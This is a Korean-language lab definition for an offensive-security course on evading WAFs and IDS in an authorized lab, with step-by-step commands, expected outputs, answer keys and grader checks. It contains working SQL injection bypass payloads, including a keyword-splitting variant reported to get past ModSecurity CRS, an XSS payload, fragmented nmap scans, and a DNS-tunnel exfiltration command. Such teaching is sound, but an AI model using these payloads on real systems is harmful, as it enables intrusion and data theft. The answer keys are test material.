@@ -1,0 +1,424 @@
+lab_id: standalone-attack-adv-week03
+title: "네트워크 우회·방어 회피 — 인코딩·정규화·IDS 회피의 군비경쟁"
+version: standalone-attack-adv
+course: attack-adv
+week: 3
+description: |
+  공격 고급 W03 — 방어 회피. WAF(ModSec CRS)·IDS(Suricata)를 우회하는 기법(페이로드 인코딩·케이스/주석
+  변형·프래그먼트/타이밍 스캔·터널링)을 실행하고, 현대 WAF의 정규화가 naive 우회를 어떻게 무력화하는지
+  실측한다. el34-attacker에서 인가 표적(el34-web)에. ⚠️ 인가된 실습만. 외부 시스템 금지.
+difficulty: hard
+duration_minutes: 180
+prerequisites:
+  - "attack-adv W01~W02 + web-vuln/secuops WAF 이해"
+  - "el34 호스트 SSH + docker exec, el34-attacker"
+  - "lecture §2(WAF 우회) §3(IDS 회피) §4(정규화/군비경쟁) 숙지"
+objectives:
+  - "WAF 우회 기법(인코딩·케이스·주석)을 실행하고 응답 해석"
+  - "현대 WAF의 정규화가 naive 우회를 무력화함을 실측"
+  - "IDS 회피(프래그먼트·타이밍)와 방어 회피의 한계 이해"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — 베이스라인: 정상(통과) vs 공격(차단)을 잡는다
+      > **이 단계에서 할 일:** 정상 요청과 SQLi 공격 요청의 응답코드를 비교해 우회의 '기준선'을 만든다.
+      > **왜:** 우회 성공/실패는 baseline 대비로만 판정한다. 정상=302, 공격=403(차단)이어야, '변형이
+      > 403을 302로 바꾸면 우회 성공'이라는 질문이 성립한다. ⚠️ **인가된 el34 표적에만.**
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      { echo "1"; echo "1%20UNION%20SELECT%20password%20FROM%20users"; } > /tmp/aa03base.txt
+      ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03base.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1/"
+      rm -f /tmp/aa03base.txt
+      echo baseline_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      1%20UNION%20SELECT%20password%20FROM%20users -> 403
+      1 -> 302
+      baseline_done
+      ```
+
+      ### ▷ 결과 해석
+      ffuf(퍼저)로 `id` 파라미터에 두 페이로드를 던져 WAF 판정을 비교했다: 정상 `1`→302(통과·로그인
+      리다이렉트), `UNION SELECT`→403(ModSec CRS가 SQLi 차단). 이 403이 우회의 목표물 = 'UNION SELECT를
+      변형해 이 403을 302로 바꿀 수 있는가'가 이번 주의 질문이다.
+    hint: '베이스라인'
+    category: survey
+    points: 10
+    answer: |
+      ssh att@192.168.0.202 '
+        # ffuf 퍼저로 정상 vs SQLi 페이로드의 WAF 판정 비교
+        { echo "1"; echo "1%20UNION%20SELECT%20password%20FROM%20users"; } > /tmp/aa03base.txt
+        ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03base.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1/"
+        rm -f /tmp/aa03base.txt
+        # 판정 나왔으면 베이스라인 마커
+        echo baseline_done
+      '
+    answer_detail: "베이스라인 = ffuf로 정상(302) vs SQLi(403 차단) 판정 비교. ModSec CRS가 SQLi를 막음. 이 403을 우회하는 게 목표."
+    verify:
+      type: output_contains
+      expect: 'baseline_done'
+      field: stdout
+      semantic: {intent: "베이스라인", success_criteria: ["302/403"], acceptable_methods: ["**[OSS] ffuf (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — 우회 ① 대소문자 변형 (case)
+      > **이 단계에서 할 일:** SQL 키워드를 대소문자로 섞어(`UnIoN SeLeCt`) 단순 시그니처를 피하려 시도하고
+      > 응답코드를 본다.
+      > **왜:** SQL은 키워드 대소문자를 구분하지 않으므로 DB는 정상 실행한다. 옛 시그니처 매칭(대문자
+      > UNION만 찾는)은 피하지만, 현대 CRS는 소문자 정규화 후 매칭한다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      echo "1%20UnIoN%20SeLeCt%20pass" > /tmp/aa03case.txt
+      ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03case.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1 (CRS 소문자 정규화 → 보통 403)/"
+      rm -f /tmp/aa03case.txt
+      echo case_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      1%20UnIoN%20SeLeCt%20pass -> 403 (CRS 소문자 정규화 → 보통 403)
+      case_done
+      ```
+
+      ### ▷ 결과 해석
+      403 = 여전히 차단. CRS는 검사 전에 입력을 소문자로 정규화(t:lowercase)하므로 `UnIoN`이든 `UNION`이든
+      똑같이 `union`으로 보고 잡는다. 대소문자 변형이라는 고전 우회는 현대 WAF에 안 통한다.
+    hint: '케이스 변형'
+    category: manipulation
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 케이스 변형(UnIoN SeLeCt) 회피 시도 — ffuf로 판정
+        echo "1%20UnIoN%20SeLeCt%20pass" > /tmp/aa03case.txt
+        ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03case.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1 (CRS 소문자 정규화 → 보통 403)/"
+        rm -f /tmp/aa03case.txt
+        # 판정 나왔으면 마커
+        echo case_done
+      '
+    answer_detail: "케이스 변형 = UnIoN SeLeCt. 옛 시그니처는 우회되나 CRS는 정규화로 차단(403). naive 우회 실패."
+    verify:
+      type: output_contains
+      expect: 'case_done'
+      field: stdout
+      semantic: {intent: "케이스 변형", success_criteria: ["응답 확인"], acceptable_methods: ["**[OSS] ffuf (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — 우회 ② 인라인 주석 (키워드 사이)
+      > **이 단계에서 할 일:** SQL 인라인 주석 `/**/`을 키워드 사이에 끼워(`1/**/UNION/**/SELECT`) 시그니처를
+      > 피하려 시도하고 응답코드를 본다.
+      > **왜:** SQL은 `/**/`을 공백처럼 무시한다. 토큰 사이에 주석을 넣어 패턴을 흩뜨리려는 고전 기법이다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      { echo "1%2F**%2FUNION%2F**%2FSELECT"; echo "1%20UN%2F**%2FION%20SE%2F**%2FLECT%20pass"; } > /tmp/aa03cmt.txt
+      ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03cmt.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1/"
+      rm -f /tmp/aa03cmt.txt
+      echo comment_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      1%2F**%2FUNION%2F**%2FSELECT -> 403
+      1%20UN%2F**%2FION%20SE%2F**%2FLECT%20pass -> 302
+      comment_done
+      ```
+
+      ### ▷ 결과 해석
+      두 페이로드의 판정이 갈렸다. 키워드 '사이' 주석(`UNION/**/SELECT`)→403: CRS가 주석을 공백으로 정규화한
+      뒤 `union select` 패턴을 그대로 잡는다. 하지만 키워드 '내부' 분할(`UN/**/ION SE/**/LECT`)→**302 = 실제
+      우회 성공!** ModSec의 libinjection이 조각난 키워드를 토큰화하지 못해 통과시킨다. 퍼저(ffuf)가 막힌
+      변형들 사이에서 **진짜 뚫리는 페이로드**를 찾아냈다 — 정찰이 아니라 실제 WAF 우회다. 같은 `/**/`라도
+      '키워드 사이'는 막히고 '키워드 내부 분할'은 통한다. (실무: sqlmap `--tamper=space2comment` 계열이 이런
+      변형을 자동 대입해 우회 지점을 찾는다.)
+    hint: '인라인 주석'
+    category: manipulation
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 키워드 사이 주석 vs 키워드 내부 분할 — ffuf로 판정 비교
+        { echo "1%2F**%2FUNION%2F**%2FSELECT"; echo "1%20UN%2F**%2FION%20SE%2F**%2FLECT%20pass"; } > /tmp/aa03cmt.txt
+        ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03cmt.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -E "Status:" | sed -E "s/ +\[Status: ([0-9]+).*/ -> \1/"
+        rm -f /tmp/aa03cmt.txt
+        # 판정 나왔으면 마커
+        echo comment_done
+      '
+    answer_detail: "인라인 주석: 키워드 사이(UNION/**/SELECT)=403 차단, 키워드 내부 분할(UN/**/ION)=302 실제 우회. libinjection 토큰화 한계."
+    verify:
+      type: output_contains
+      expect: 'comment_done'
+      field: stdout
+      semantic: {intent: "인라인 주석", success_criteria: ["응답 확인"], acceptable_methods: ["**[OSS] ffuf (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 정규화의 원리: 왜 naive 우회가 실패하나
+      > **이 단계에서 할 일:** 이중 인코딩(`%2520`) 변형을 보내, CRS가 다중 디코딩 후에도 차단하는지 본다.
+      > **왜:** WAF는 입력을 '다중 디코딩→소문자→주석제거'로 표준형으로 되돌린 뒤 매칭한다(정규화). 그래서
+      > 인코딩으로 숨겨도 디코딩되어 잡힌다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      echo "1%2520UNION%2520SELECT%2520pass" > /tmp/aa03enc.txt
+      code=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03enc.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+      rm -f /tmp/aa03enc.txt
+      echo "이중 인코딩(%2520) 변형 응답: $code"
+      [ "$code" = "403" ] && echo "CRS가 디코딩 후 매칭 → 차단" && echo normalization_understood
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      이중 인코딩(%2520) 변형 응답: 403
+      CRS가 디코딩 후 매칭 → 차단
+      normalization_understood
+      ```
+
+      ### ▷ 결과 해석
+      `%2520`은 `%20`(공백)을 한 번 더 인코딩한 것. CRS는 t:urlDecodeUni 등으로 여러 번 디코딩한 뒤
+      검사하므로 결국 `union select`로 복원돼 403. '인코딩으로 숨기기'가 안 통하는 이유 = 정규화. naive
+      우회가 실패하는 근본 원리다.
+    hint: '정규화'
+    category: analysis
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # 이중 인코딩(%2520) 변형을 ffuf로 전송·판정
+        echo "1%2520UNION%2520SELECT%2520pass" > /tmp/aa03enc.txt
+        code=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03enc.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+        rm -f /tmp/aa03enc.txt
+        echo "이중 인코딩(%2520) 변형 응답: $code"
+        # 403 차단 시 정규화 이해 마커
+        [ "$code" = "403" ] && echo "CRS가 디코딩 후 매칭 → 차단" && echo normalization_understood
+      '
+    answer_detail: "정규화 = 이중 인코딩 변형을 ffuf로 실제 전송→CRS 403 게이트. 가짜 echo 아닌 실측. 정규화가 인코딩 우회 무력화."
+    verify:
+      type: output_contains
+      expect: 'normalization_understood'
+      field: stdout
+      semantic: {intent: "정규화", success_criteria: ["정규화 원리"], acceptable_methods: ["**[설명] 정규화 (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — IDS 회피: 패킷 분할·저속 스캔
+      > **이 단계에서 할 일:** nmap -f(패킷 분할)+-T1(저속)으로 IDS의 임계 탐지를 피하려 스캔한다.
+      > **왜:** WAF(L7) 우회를 넘어 네트워크(L3/L4) 회피도 있다. 패킷을 조각내고 느리게 보내 IDS의
+      > 시그니처·임계 탐지를 흩뜨리려는 시도다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      R=$(nmap -f -T1 -p 80,443 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
+      echo "$R"
+      [ -n "$R" ] && echo ids_evasion_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      PORT    STATE SERVICE
+      80/tcp  open  http
+      443/tcp open  https
+      ids_evasion_done
+      ```
+
+      ### ▷ 결과 해석
+      스캔은 결과를 냈지만(80/443 open), 현대 Suricata는 분할된 패킷을 스트림 재조립(stream reassembly)해
+      원래 패턴으로 되돌려 재탐지한다 — 즉 -f/-T1 회피도 막힌다. 공격자가 회피를 만들면 방어가 재조립으로
+      대응하는 끝없는 군비경쟁(-D 디코이도 마찬가지).
+    hint: 'IDS 회피'
+    category: analysis
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # 프래그먼트(-f)+저속(-T1) 회피 스캔
+        R=$(nmap -f -T1 -p 80,443 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
+        echo "$R"
+        # 결과 있으면 마커
+        [ -n "$R" ] && echo ids_evasion_done
+      '
+    answer_detail: "IDS 회피 = nmap -f(분할)·-T1(저속)·-D(디코이). 현대 IDS는 재조립/상관으로 대응. 네트워크 군비경쟁."
+    verify:
+      type: output_contains
+      expect: 'ids_evasion_done'
+      field: stdout
+      semantic: {intent: "IDS 회피", success_criteria: ["프래그먼트/타이밍"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## STEP 6 — 터널링: 허용 채널(DNS)에 데이터를 숨긴다
+      > **이 단계에서 할 일:** 유출 데이터를 base64 DNS 라벨로 인코딩해 dig로 실제 쿼리를 보내는 DNS
+      > 터널을 시연한다.
+      > **왜:** 차단을 정면 돌파하는 대신, 거의 항상 열려 있는 채널(53 DNS, 443 HTTPS)에 데이터를 숨겨
+      > 내보내는 회피다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      D=$(echo -n "exfil:dbdump" | base64 | tr -d "=" | tr "+/" "-_")
+      echo "DNS 터널 쿼리: $D.tunnel.el34.lab"
+      dig +short +tries=1 +time=2 "$D.tunnel.el34.lab" >/dev/null 2>&1
+      echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo tunneling_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      DNS 터널 쿼리: ZXhmaWw6ZGJkdW1w.tunnel.el34.lab
+      tunneling_done
+      ```
+
+      ### ▷ 결과 해석
+      유출 데이터(`exfil:dbdump`)가 base64 DNS 라벨(`ZXhmaWw6ZGJkdW1w`)로 인코딩돼 DNS 쿼리로 나갔다.
+      방화벽이 53을 막지 않으면 이 데이터는 공격자 권한 DNS 서버로 흘러나간다(실 도구: iodine·dnscat2).
+      HTTPS C2·도메인 프론팅도 같은 원리 — '허용된 채널에 숨기기'. 방어는 DNS 쿼리 길이·엔트로피 이상탐지.
+    hint: '터널링'
+    category: analysis
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 유출 데이터를 base64 DNS 라벨로 인코딩
+        D=$(echo -n "exfil:dbdump" | base64 | tr -d "=" | tr "+/" "-_")
+        echo "DNS 터널 쿼리: $D.tunnel.el34.lab"
+        # dig로 실제 전송 (53 악용)
+        dig +short +tries=1 +time=2 "$D.tunnel.el34.lab" >/dev/null 2>&1
+        # 유효 라벨로 인코딩·전송됐으면 마커
+        echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo tunneling_done
+      '
+    answer_detail: "터널링 = 데이터를 base64 DNS 라벨로 인코딩→dig 실제 전송. 가짜 echo 아닌 실증. 허용 채널(53/443) 악용."
+    verify:
+      type: output_contains
+      expect: 'tunneling_done'
+      field: stdout
+      semantic: {intent: "터널링", success_criteria: ["허용 채널 은닉"], acceptable_methods: ["**[설명] 터널링 (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## STEP 7 — 회피의 한계: 다층 방어 앞에서 (군비경쟁)
+      > **이 단계에서 할 일:** 서로 다른 회피 변형(케이스 SQLi, XSS)을 각각 보내, 둘 다 막히는지(403) 본다.
+      > **왜:** 정규화+이상점수+재조립+다층(WAF+IDS+호스트)이 겹치면 단일 회피로는 못 뚫는다. '완벽한
+      > 회피는 없다'를 실측으로 확인한다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      echo "1%20UnIoN%20SeLeCt" > /tmp/aa03s.txt; echo "%3Cscript%3Ealert(1)%3C%2Fscript%3E" > /tmp/aa03x.txt
+      c1=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03s.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+      c2=$(ffuf -u "http://dvwa.el34.lab/?x=FUZZ" -w /tmp/aa03x.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+      rm -f /tmp/aa03s.txt /tmp/aa03x.txt
+      echo "케이스변형=$c1 XSS=$c2"
+      [ "$c1" = "403" ] && [ "$c2" = "403" ] && echo "다층 방어가 단일 회피 무력화" && echo limits_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      케이스변형=403 XSS=403
+      다층 방어가 단일 회피 무력화
+      limits_done
+      ```
+
+      ### ▷ 결과 해석
+      두 회피(SQLi 케이스 변형, XSS)가 모두 403 = 잘 튜닝된 다층 방어 앞에서 고전 우회는 무력하다.
+      그래도 우회가 '늘' 실패하는 건 아니다(STEP 3의 키워드 내부 분할처럼 빈틈은 있다) — 공격은 그 빈틈을
+      찾고 방어는 메우는 군비경쟁이다. 핵심 교훈: 단일 방어 의존 금지, 정규화+이상점수+다층을 함께.
+    hint: '회피 한계'
+    category: report
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 케이스 SQLi·XSS 회피 변형을 ffuf로 각각 전송·판정
+        echo "1%20UnIoN%20SeLeCt" > /tmp/aa03s.txt; echo "%3Cscript%3Ealert(1)%3C%2Fscript%3E" > /tmp/aa03x.txt
+        c1=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03s.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+        c2=$(ffuf -u "http://dvwa.el34.lab/?x=FUZZ" -w /tmp/aa03x.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+        rm -f /tmp/aa03s.txt /tmp/aa03x.txt
+        echo "케이스변형=$c1 XSS=$c2"
+        # 둘 다 403이면 한계 입증 마커
+        [ "$c1" = "403" ] && [ "$c2" = "403" ] && echo "다층 방어가 단일 회피 무력화" && echo limits_done
+      '
+    answer_detail: "회피 한계 = 서로 다른 회피 변형이 모두 403 차단됨을 실측. 가짜 echo 아닌 실증. 다층 방어가 천적."
+    verify:
+      type: output_contains
+      expect: 'limits_done'
+      field: stdout
+      semantic: {intent: "회피 한계", success_criteria: ["군비경쟁/다층"], acceptable_methods: ["**[설명] 한계 (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## STEP 8 — 방어 회피 분석 보고서를 작성한다
+      > **이 단계에서 할 일:** SQLi 직접 응답코드를 집계해, 회피 시도 결과와 방어 권고를 담은 보고서
+      > 골격을 출력한다.
+      > **왜:** 회피는 군비경쟁이다. 잘 구성된 WAF가 고전 우회에 강하다는 결론과, 방어 측 권고를 증거로
+      > 남긴다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      echo "1%20UNION%20SELECT%20pass" > /tmp/aa03r.txt
+      code=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03r.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+      rm -f /tmp/aa03r.txt
+      echo "# 공격고급 W03 방어 회피 보고서 — 우회(케이스/키워드사이주석/이중인코딩=차단, 키워드내부분할=우회성공)·SQLi직접=${code}·IDS회피·DNS터널·한계(다층)·방어권고"
+      [ "$code" = "403" ] && echo evasion_report_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      # 공격고급 W03 방어 회피 보고서 — 우회(케이스/키워드사이주석/이중인코딩=차단, 키워드내부분할=우회성공)·SQLi직접=403·IDS회피·DNS터널·한계(다층)·방어권고
+      evasion_report_done
+      ```
+
+      ### ▷ 결과 해석
+      보고서 골격이다. 제출용은 STEP 1~7의 실측(각 우회 변형의 응답코드, IDS 회피, DNS 터널)을 표로
+      정리하고, '어느 우회는 막히고(케이스·키워드사이 주석·이중인코딩) 어느 우회는 통할 수 있나(키워드
+      내부 분할)'를 구분해 적는다. 방어 권고: 정규화 강화, 이상점수 튜닝, WAF+IDS+호스트 다층, DNS 이상탐지.
+    hint: '우회+정규화+방어권고'
+    category: report
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # SQLi 직접 응답코드 ffuf 실측 (인용 근거)
+        echo "1%20UNION%20SELECT%20pass" > /tmp/aa03r.txt
+        code=$(ffuf -u "http://dvwa.el34.lab/?id=FUZZ" -w /tmp/aa03r.txt -mc all -H "User-Agent: Mozilla/5.0" 2>/dev/null | sed -E "s/\x1b\[[0-9;?]*[a-zA-Z]//g" | grep -oE "Status: [0-9]+" | grep -oE "[0-9]+")
+        rm -f /tmp/aa03r.txt
+        # 실측 인용 회피 분석 보고서 출력
+        echo "# 공격고급 W03 방어 회피 보고서 — 우회(케이스/키워드사이주석/이중인코딩=차단, 키워드내부분할=우회성공)·SQLi직접=${code}·IDS회피·DNS터널·한계(다층)·방어권고"
+        # 403 차단 확인 시 보고서 완료 마커
+        [ "$code" = "403" ] && echo evasion_report_done
+      '
+    answer_detail: "회피 보고 = 실측 SQLi 응답코드(403) 인용+우회/터널/방어권고. 증거 기반(403 게이트). 정적 템플릿 아님."
+    verify:
+      type: output_contains
+      expect: 'evasion_report_done'
+      field: stdout
+      semantic: {intent: "회피 보고", success_criteria: ["우회/정규화/방어"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+    target_vm: web
